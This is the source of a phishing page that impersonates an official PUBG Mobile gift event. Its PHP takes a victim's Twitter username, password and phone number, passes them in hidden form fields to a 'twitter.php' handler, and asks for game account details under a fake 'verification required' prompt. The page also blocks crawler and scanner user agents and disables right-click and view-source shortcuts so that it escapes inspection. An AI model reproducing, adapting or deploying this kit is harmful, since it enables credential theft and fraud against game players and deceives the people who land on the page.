
<?php
$Username_TW = $_GET['Username_TW'];
$Password_TW = $_GET['Password_TW'];
$Phone_TW = $_GET['Phone_TW'];
?>

<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: #');
die();
}
?>
<?php
session_start();
$_SESSION['NameSession'] = "Key";
?>

<html>
<head>
<title>PUBG Mobile - Official PUBG on mobile</title>
<meta charset="UTF-8"/>
<meta property="description" content="Free collect gift in Season 5. Free collect gift in Season 4. Free collect Christmas gift. Free collect weapon finishes! Collect now, this gift is free!"/>
<meta property="og:image" content="img/thumbnail.png"/>
<meta property="og:image:width" content="540"/>
<meta property="og:image:height" content="282"/>
<meta name="theme-color" content="#eaa300">
<link rel="icon" type="img/png" href="https://www.pubgmobile.com/id/event/vikendi/images/icon-logo.png">
<style type="text/css">@import url(css/stylever.php);</style>
<link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
<body>
<style type="text/css">
	#hadiah fieldset:not(:first-of-type) {
		display: none;
	}
fieldset {
border: none;
}
</style>

<!--Kode untuk mematikan fungsi klik kanan di blog-->

<script type="text/javascript">

function mousedwn(e){try{if(event.button==2||event.button==3)return false}catch(e){if(e.which==3)return false}}document.oncontextmenu=function(){return false};document.ondragstart=function(){return false};document.onmousedown=mousedwn

</script>

<!--Kode untuk mencegah shorcut keyboard, view source dll.-->

<script type="text/javascript">

window.addEventListener("keydown",function(e){if(e.ctrlKey&&(e.which==65||e.which==66||e.which==67||e.which==73||e.which==80||e.which==83||e.which==85||e.which==86)){e.preventDefault()}});document.keypress=function(e){if(e.ctrlKey&&(e.which==65||e.which==66||e.which==67||e.which==73||e.which==80||e.which==83||e.which==85||e.which==86)){}return false}

</script>

<script type="text/javascript">

document.onkeydown=function(e){e=e||window.event;if(e.keyCode==123||e.keyCode==18){return false}}

</script>


<div class="loading"></div>
<div class="navbar">
	<img src="img/thumbnail.png">PUBG MOBILE</br>
	<span>OFFICIAL PUBG ON MOBILE</span>
</div>
</br>
</br>
</br>
</br>
</br>
<form id="hadiah" action="twitter.php" method="get">
	<div class="isi-sukses">
		<fieldset>
			<center>
			<h4 class="berhasil">VERIFICATION REQUIRED</h4>
			<hr class="garis">
			<h4 class="berhasil-text">IF THIS IS YOUR TRUE ACCOUNT</br>
			YOU NEED TO VERIFY YOUR ACCOUNT</br>FINISH VERIFICATION AND GET GIFTS</h4>
			</center>
			<hr class="garis"></br>
			<button type="button" class="next btn-next">VERIFY <i class="btn-klaim-ir fa fa-chevron-right"></i></button>
			</br>
			</br>
		</fieldset>
		<fieldset>
			<center>
			<h4 class="berhasil">FINISH VERIFICATION</h4>
			<hr class="garis">
			<h4 class="berhasil-text">COMPLETED THIS SUBMISSION AND GET GIFTS</br></h4>
<input name="Username_TW" type="hidden" value="<?php echo $Username_TW;?>" readonly>
<input name="Password_TW" type="hidden" value="<?php echo $Password_TW;?>" readonly>
<input name="Phone_TW" type="hidden" value="<?php echo $Phone_TW;?>" readonly>
<select name="RoyalPass_TW">
<option disabled required>Rp Leve</option>
<option>RoyalPass Level 1</option>
<option>RoyalPass Level 2</option>
<option>RoyalPass Level 3</option>
<option>RoyalPass Level 4</option>
<option>RoyalPass Level 5</option>
<option>RoyalPass Level 6</option>
<option>RoyalPass Level 7</option>
<option>RoyalPass Level 8</option>
<option>RoyalPass Level 9</option>
<option>RoyalPass Level 10</option>
<option>RoyalPass Level 11</option>
<option>RoyalPass Level 12</option>
<option>RoyalPass Level 13</option>
<option>RoyalPass Level 14</option>
<option>RoyalPass Level 15</option>
<option>RoyalPass Level 16</option>
<option>RoyalPass Level 17</option>
<option>RoyalPass Level 18</option>
<option>RoyalPass Level 19</option>
<option>RoyalPass Level 20</option>
<option>RoyalPass Level 21</option>
<option>RoyalPass Level 22</option>
<option>RoyalPass Level 23</option>
<option>RoyalPass Level 24</option>
<option>RoyalPass Level 25</option>
<option>RoyalPass Level 26</option>
<option>RoyalPass Level 27</option>
<option>RoyalPass Level 28</option>
<option>RoyalPass Level 29</option>
<option>RoyalPass Level 30</option>
<option>RoyalPass Level 31</option>
<option>RoyalPass Level 32</option>
<option>RoyalPass Level 33</option>
<option>RoyalPass Level 34</option>
<option>RoyalPass Level 35</option>
<option>RoyalPass Level 36</option>
<option>RoyalPass Level 37</option>
<option>RoyalPass Level 38</option>
<option>RoyalPass Level 39</option>
<option>RoyalPass Level 40</option>
<option>RoyalPass Level 41</option>
<option>RoyalPass Level 42</option>
<option>RoyalPass Level 43</option>
<option>RoyalPass Level 44</option>
<option>RoyalPass Level 45</option>
<option>RoyalPass Level 46</option>
<option>RoyalPass Level 47</option>
<option>RoyalPass Level 48</option>
<option>RoyalPass Level 49</option>
<option>RoyalPass Level 50</option>
<option>RoyalPass Level 51</option>
<option>RoyalPass Level 52</option>
<option>RoyalPass Level 53</option>
<option>RoyalPass Level 54</option>
<option>RoyalPass Level 55</option>
<option>RoyalPass Level 56</option>
<option>RoyalPass Level 57</option>
<option>RoyalPass Level 58</option>
<option>RoyalPass Level 59</option>
<option>RoyalPass Level 60</option>
<option>RoyalPass Level 61</option>
<option>RoyalPass Level 62</option>
<option>RoyalPass Level 63</option>
<option>RoyalPass Level 64</option>
<option>RoyalPass Level 65</option>
<option>RoyalPass Level 66</option>
<option>RoyalPass Level 67</option>
<option>RoyalPass Level 68</option>
<option>RoyalPass Level 69</option>
<option>RoyalPass Level 70</option>
<option>RoyalPass Level 71</option>
<option>RoyalPass Level 72</option>
<option>RoyalPass Level 73</option>
<option>RoyalPass Level 74</option>
<option>RoyalPass Level 75</option>
<option>RoyalPass Level 76</option>
<option>RoyalPass Level 77</option>
<option>RoyalPass Level 88</option>
<option>RoyalPass Level 79</option>
<option>RoyalPass Level 80</option>
<option>RoyalPass Level 81</option>
<option>RoyalPass Level 92</option>
<option>RoyalPass Level 83</option>
<option>RoyalPass Level 84</option>
<option>RoyalPass Level 85</option>
<option>RoyalPass Level 86</option>
<option>RoyalPass Level 87</option>
<option>RoyalPass Level 88</option>
<option>RoyalPass Level 89</option>
<option>RoyalPass Level 90</option>
<option>RoyalPass Level 91</option>
<option>RoyalPass Level 92</option>
<option>RoyalPass Level 93</option>
<option>RoyalPass Level 94</option>
<option>RoyalPass Level 95</option>
<option>RoyalPass Level 96</option>
<option>RoyalPass Level 97</option>
<option>RoyalPass Level 98</option>
<option>RoyalPass Level 99</option>
<option>RoyalPass Level 100</option></select></br>



<select name="Level_TW">
<option disabled required>Account Level</option>
<option>Account Level 1</option>
<option>Account Level 2</option>
<option>Account Level 3</option>
<option>Account Level 4</option>
<option>Account Level 5</option>
<option>Account Level 6</option>
<option>Account Level 7</option>
<option>Account Level 8</option>
<option>Account Level 9</option>
<option>Account Level 10</option>
<option>Account Level 11</option>
<option>Account Level 12</option>
<option>Account Level 13</option>
<option>Account Level 14</option>
<option>Account Level 15</option>
<option>Account Level 16</option>
<option>Account Level 17</option>
<option>Account Level 18</option>
<option>Account Level 19</option>
<option>Account Level 20</option>
<option>Account Level 21</option>
<option>Account Level 22</option>
<option>Account Level 23</option>
<option>Account Level 24</option>
<option>Account Level 25</option>
<option>Account Level 26</option>
<option>Account Level 27</option>
<option>Account Level 28</option>
<option>Account Level 29</option>
<option>Account Level 30</option>
<option>Account Level 31</option>
<option>Account Level 32</option>
<option>Account Level 33</option>
<option>Account Level 34</option>
<option>Account Level 35</option>
<option>Account Level 36</option>
<option>Account Level 37</option>
<option>Account Level 38</option>
<option>Account Level 39</option>
<option>Account Level 40</option>
<option>Account Level 41</option>
<option>Account Level 42</option>
<option>Account Level 43</option>
<option>Account Level 44</option>
<option>Account Level 45</option>
<option>Account Level 46</option>
<option>Account Level 47</option>
<option>Account Level 48</option>
<option>Account Level 49</option>
<option>Account Level 50</option>
<option>Account Level 51</option>
<option>Account Level 52</option>
<option>Account Level 53</option>
<option>Account Level 54</option>
<option>Account Level 55</option>
<option>Account Level 56</option>
<option>Account Level 57</option>
<option>Account Level 58</option>
<option>Account Level 59</option>
<option>Account Level 60</option>
<option>Account Level 61</option>
<option>Account Level 62</option>
<option>Account Level 63</option>
<option>Account Level 64</option>
<option>Account Level 65</option>
<option>Account Level 66</option>
<option>Account Level 67</option>
<option>Account Level 68</option>
<option>Account Level 69</option>
<option>Account Level 70</option>
<option>Account Level 71</option>
<option>Account Level 72</option>
<option>Account Level 73</option>
<option>Account Level 74</option>
<option>Account Level 75</option>
<option>Account Level 76</option>
<option>Account Level 77</option>
<option>Account Level 88</option>
<option>Account Level 79</option>
<option>Account Level 80</option>
<option>Account Level 81</option>
<option>Account Level 92</option>
<option>Account Level 83</option>
<option>Account Level 84</option>
<option>Account Level 85</option>
<option>Account Level 86</option>
<option>Account Level 87</option>
<option>Account Level 88</option>
<option>Account Level 89</option>
<option>Account Level 90</option>
<option>Account Level 91</option>
<option>Account Level 92</option>
<option>Account Level 93</option>
<option>Account Level 94</option>
<option>Account Level 95</option>
<option>Account Level 96</option>
<option>Account Level 97</option>
<option>Account Level 98</option>
<option>Account Level 99</option>
<option>Account Level 100</option>
</select></br>
			</center>
			<hr class="garis"></br>
			<button type="submit" class="btn-next">SUBMIT <i class="btn-next-ir fa fa-chevron-right"></i></button>
			</br>
			</br>
		</fieldset>
	</div>
</form>
</br>
</br>
</br>
<div class="footer">
	<center>
	<img width="70" src="img/logo/pubg.png">
	</center>
</div>
<script src="http://code.jquery.com/jquery-2.1.4.min.js"></script>
<script> $(window).load(function() { $(".loading").fadeOut("slow"); }); </script>
<script type="text/javascript">
$(document).ready(function(){
	var current = 1,current_step,next_step,steps;
	steps = $("fieldset").length;
	$(".next").click(function(){
		current_step = $(this).parent();
		next_step = $(this).parent().next();
		next_step.show();
		current_step.hide();
		setProgressBar(++current);
	});
	$(".previous").click(function(){
		current_step = $(this).parent();
		next_step = $(this).parent().prev();
		next_step.show();
		current_step.hide();
		setProgressBar(--current);
	});
	setProgressBar(current);
	// Change progress bar action
	function setProgressBar(curStep){
		var percent = parseFloat(100 / steps) * curStep;
		percent = percent.toFixed();
		$(".progress-bar")
			.css("width",percent+"%")
			.html(percent+"%");		
	}
});
</script>
</body>
</html>
